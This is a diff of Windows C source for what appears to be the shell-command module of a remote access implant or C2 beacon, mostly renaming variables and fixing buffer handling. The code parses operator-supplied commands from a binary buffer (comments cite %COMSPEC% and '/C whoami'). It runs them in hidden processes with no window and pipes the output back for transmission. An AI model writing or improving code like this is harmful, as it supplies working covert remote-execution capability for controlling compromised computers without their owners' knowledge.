@@ -36,16 +36,16 @@ typedef struct {
     unsigned char* shellBuf;
 } ParseCommandShellparse;
 
-struct ThreadArgs {
-    unsigned char* commandBuf;
-    size_t* commandBuflen;
+struct ShellThreadArgs {
+    unsigned char* cmdBuffer;
+    size_t cmdBufferLength;
 };
 
-ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
+ParseCommandShellparse ParseCommandShell(unsigned char* cmdBuffer) {
     // pathLength(4 Bytes) | path | cmdLength(4 Bytes) |  cmd
     uint8_t pathLenBytes[4];
     ParseCommandShellparse result = { 0 };
-    memcpy(pathLenBytes, commandBuf, 4);
+    memcpy(pathLenBytes, cmdBuffer, 4);
     uint32_t pathLength = bigEndianUint32(pathLenBytes);
     unsigned char* path = (unsigned char*)malloc(pathLength + 1);
     if (!path) {
@@ -55,10 +55,10 @@ ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
     if (pathLength > 0) {
         path[pathLength] = '\0';
     }
-    unsigned char* pathstart = commandBuf + 4;
+    unsigned char* pathstart = cmdBuffer + 4;
     memcpy(path, pathstart, pathLength); // %COMSPEC%
     uint8_t cmdLenBytes[4];
-    unsigned char* cmdLenBytesStart = commandBuf + 4 + pathLength;
+    unsigned char* cmdLenBytesStart = cmdBuffer + 4 + pathLength;
     memcpy(cmdLenBytes, cmdLenBytesStart, 4);
     uint32_t cmdLength = bigEndianUint32(cmdLenBytes);
     unsigned char* cmdArgs = (unsigned char*)malloc(cmdLength + 1);
@@ -70,7 +70,7 @@ ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
     if (cmdLength > 0) {
         cmdArgs[cmdLength] = '\0';
     }
-    unsigned char* cmdBufferStart = commandBuf + 8 + pathLength;
+    unsigned char* cmdBufferStart = cmdBuffer + 8 + pathLength;
     memcpy(cmdArgs, cmdBufferStart, cmdLength);     // /C whoami
     unsigned char* envKey = str_replace_all(path, "%", ""); // 去除 "%"
 
@@ -85,9 +85,9 @@ ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
 
 DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
     Sleep(2000);
-    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
-    unsigned char* commandBuf = args->commandBuf;
-    size_t* commandBuflen = args->commandBuflen;
+    struct ShellThreadArgs* args = (struct ShellThreadArgs*)lpParam;
+    unsigned char* cmdBuffer = args->cmdBuffer;
+    size_t cmdBufferLength = args->cmdBufferLength;
 
     BOOL bRet = FALSE;
 
@@ -110,7 +110,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
     si.hStdOutput = hWritePipe;
     si.wShowWindow = SW_HIDE;
 
-    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
+    ParseCommandShellparse ParseCommand = ParseCommandShell(cmdBuffer);
     LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;
 
     // 构建 CreateProcessA 参数
@@ -121,7 +121,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
     if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
         free(shellBuf);
-        free(args->commandBuf);
+        free(args->cmdBuffer);
         free(args);
         CloseHandle(hReadPipe);
         CloseHandle(hWritePipe);
@@ -138,7 +138,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
         fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
         free(buffer);
         free(shellBuf);
-        free(args->commandBuf);
+        free(args->cmdBuffer);
         free(args);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -157,6 +157,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
                 unsigned char* resultStr = malloc(strlen(endStr) + 1);
                 if (resultStr) {
                     memcpy(resultStr, endStr, strlen(endStr) + 1);
+                    resultStr[strlen(endStr)] = '\0';
                     DataProcess(resultStr, strlen(endStr), 0);
                     break;
                 }
@@ -168,7 +169,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 CloseHandle(hReadPipe);
-                free(args->commandBuf);
+                free(args->cmdBuffer);
                 free(args);
                 return FALSE;
             }
@@ -203,16 +204,16 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     CloseHandle(hReadPipe);
-    free(args->commandBuf);
+    free(args->cmdBuffer);
     free(args);
     return TRUE;
 }
 
 DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     Sleep(2000);
-    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
-    unsigned char* commandBuf = args->commandBuf;
-    size_t* commandBuflen = args->commandBuflen;
+    struct ShellThreadArgs* args = (struct ShellThreadArgs*)lpParam;
+    unsigned char* cmdBuffer = args->cmdBuffer;
+    size_t cmdBufferLength = args->cmdBufferLength;
 
     BOOL bRet = FALSE;
 
@@ -223,7 +224,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
 
     if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
         fprintf(stderr, "CreatePipe Failed With Error:%lu", GetLastError());
-        free(args->commandBuf);
+        free(args->cmdBuffer);
         free(args);
         return FALSE;
     }
@@ -236,7 +237,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     si.hStdOutput = hWritePipe;
     si.wShowWindow = SW_HIDE;
 
-    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
+    ParseCommandShellparse ParseCommand = ParseCommandShell(cmdBuffer);
     LPSTR shellPath = (LPSTR)ParseCommand.shellPath;
     LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;
 
@@ -249,7 +250,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
         free(shellBuf);
-        free(args->commandBuf);
+        free(args->cmdBuffer);
         free(args);
         CloseHandle(hReadPipe);
         CloseHandle(hWritePipe);
@@ -266,7 +267,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
         fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
         free(buffer);
         free(shellBuf);
-        free(args->commandBuf);
+        free(args->cmdBuffer);
         free(args);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -285,6 +286,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
                 unsigned char* resultStr = malloc(strlen(endStr) + 1);
                 if(resultStr) {
                     memcpy(resultStr, endStr, strlen(endStr) + 1);
+					resultStr[strlen(endStr)] = '\0';
                     DataProcess(resultStr, strlen(endStr), 0);
                     break;
 				}
@@ -296,7 +298,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 CloseHandle(hReadPipe);
-                free(args->commandBuf);
+                free(args->cmdBuffer);
                 free(args);
                 return FALSE;
             }
@@ -331,7 +333,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     CloseHandle(hReadPipe);
-    free(args->commandBuf);
+    free(args->cmdBuffer);
     free(args);
     return TRUE;
 }
@@ -339,12 +341,12 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
 VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
 { 
 	// 解决线程还么运行 commandBuf 可能被释放的问题
-    struct ThreadArgs* args = malloc(sizeof(struct ThreadArgs));
-    args->commandBuf = (unsigned char*)malloc(*commandBuflen);
-    if (args->commandBuf) {
-        memcpy(args->commandBuf, commandBuf, *commandBuflen);
+    struct ShellThreadArgs* args = malloc(sizeof(struct ShellThreadArgs));
+    if (args) {
+        args->cmdBuffer = (unsigned char*)malloc(*commandBuflen);
+        memcpy(args->cmdBuffer, commandBuf, *commandBuflen);
+        args->cmdBufferLength = *commandBuflen;
     }
-    args->commandBuflen = *commandBuflen;
 
     ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
     HANDLE myThread;
@@ -358,7 +360,7 @@ VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
             NULL);                      // 不存储线程ID
         if (myThread == NULL) {
             fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
-			free(args->commandBuf);
+			free(args->cmdBuffer);
             free(args);
             return;
         }
@@ -374,7 +376,7 @@ VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
             NULL);                      // 不存储线程ID
         if (myThread == NULL) {
             fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
-            free(args->commandBuf);
+            free(args->cmdBuffer);
             free(args);
             return;
         }
